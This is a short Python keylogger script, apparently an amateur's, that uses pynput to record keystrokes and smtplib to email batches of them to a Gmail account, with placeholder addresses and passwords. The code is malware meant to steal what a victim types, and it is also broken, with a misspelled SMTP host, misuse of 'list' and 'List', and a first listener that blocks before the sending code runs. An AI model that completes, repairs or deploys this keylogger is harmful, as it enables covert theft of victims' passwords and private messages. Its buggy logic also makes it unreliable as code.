from os import startfile
from typing import List
from pynput import keyboard
from pynput.keyboard import Listener
import smtplib
def log_keystrok(key):
    if key == 'key.space':
        key=' '
    if key == 'key.shift_r':
        key=' '
    if key == "key.enter":
        key='\n'
    print(key)
with Listener(on_press=log_keystrok) as l:
    l.join()
def sender(key):
    fromaddr = "your gmail" 
    toaddrs = "another gmail"
    msg = key
    password = ("pass")
    username = ("pass")
    server = smtplib.SMTP('smpt.gmail.com:587')
    server.starttls()
    server.login(username , password)
    server.sendmail(fromaddr, toaddrs , msg)
    print("Gmail sended successFuly")
    list.clear()
    liste = []
def log_keystroke(key):
    list.append(key)
    strl = str(list)
    if len(List)==20:
        sender(strl)
with keyboard.Listener(on_press=log_keystroke)as l:
     l.join()
fromaddr = 'gmail'
toaddrs = 'another gmail'
msg = 'this is a massage for test'
username = '////'
password = '/////'
#smtplib برایه برقرار کردن ارتباط#
server = smtplib.SMTP('smpt.gmail.com')
server.starttls()
server.login(username , password )
server.sendmail(fromaddr , toaddrs , msg )
server.quit()
print (" Gmail sended successFuly ")
